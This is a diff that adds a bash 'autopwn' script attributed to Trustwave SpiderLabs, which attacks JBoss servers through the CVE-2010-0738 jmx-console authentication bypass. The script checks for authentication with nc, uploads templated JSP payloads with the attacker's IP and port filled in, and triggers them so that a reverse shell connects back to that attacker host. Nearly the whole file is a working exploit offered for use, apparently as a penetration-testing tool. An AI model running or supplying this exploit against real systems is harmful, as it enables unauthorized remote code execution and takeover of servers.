@@ -1,0 +1,68 @@
+#!/bin/bash
+if [ -z $1 ]
+then
+printf "[!] JBoss autopwn with CVE-2010-0738\n[!] Usage: $0 server port\n"
+printf "[!] Christian Papathanasiou cpapathanasiou@trustwave.com\n[!] Trustwave SpiderLabs\n"
+else
+
+printf "[x] Checking if authentication is enabled..\n"
+I=`printf "GET /jmx-console/ HTTP/1.0\n\n" | nc $1 $2 | grep -i authentication`
+
+if [ -z "$I" ]
+then
+printf "[x] Authentication not enabled!\n"
+
+serverinfo=`lynx --dump http://$1:$2/jmx-console/HtmlAdaptor?action=inspectMBean\&name=jboss.system:type=ServerInfo | grep -i osname`
+
+windows=`echo $serverinfo | grep -i windows`;
+if [ -z "$windows" ] 
+then 
+printf "[x] Detected a non-windows target\n"
+./e.sh $1 $2 2>/dev/null
+else 
+printf "[x] Detected a Windows target\n"
+./e2.sh $1 $2 2>/dev/null 
+fi
+
+else
+printf "[!] Authentication enabled!\n"
+printf "[x] Proceeding to use CVE-2010-0738 JBoss /jmx-console authentication bypass\n"
+printf "[!] Is this a *nix based or Windows based JBoss instance? "
+read instance
+printf "[!] Which IP should I send the reverse shell to? "
+read ip
+printf "[!] Which port should I send the reverse shell to? "
+read port
+if [ $instance == "nix" ]
+then
+printf "[x] *nix based selected...\n"
+J=`cat cve-2010-0738-linux | sed -e "s/MYIP/$ip/g" | sed -e "s/hostx/$1/g" | sed -e "s/portx/$2/g" | sed -e "s/REV-PORT/$port/g" | nc $1 $2 | grep -i "200 OK"`
+if [ -z "$J" ]
+then 
+printf "[!] exploitation failed..likely not vulnerable to auth bypass\n"
+else
+printf "HEAD /jmx-console/hax0r3.jsp HTTP/1.0\n\n" | nc $1 $2 1>/dev/null 2>/dev/null 
+printf "[!] you should now have a shell on $ip:$port\n"
+fi
+
+else
+printf "[x] Windows based selected..\n"
+J=`cat cve-2010-0738-win | sed -e "s/MYIP/$ip/g" | sed -e "s/hostx/$1/g" | sed -e "s/portx/$2/g" | sed -e "s/REV-PORT/$port/g" | nc $1 $2 | grep -i "200 OK"`
+if [ -z "$J" ]
+then 
+printf "[!] exploitation failed..likely not vulnerable to auth bypass\n"
+else 
+printf "HEAD /jmx-console/hax0rwin.jsp HTTP/1.0\n\n" | nc $1 $2 1>/dev/null 2>/dev/null
+printf "[!] you should now have a shell on $ip:$port\n"
+fi
+fi
+
+
+
+
+
+
+
+fi
+
+fi
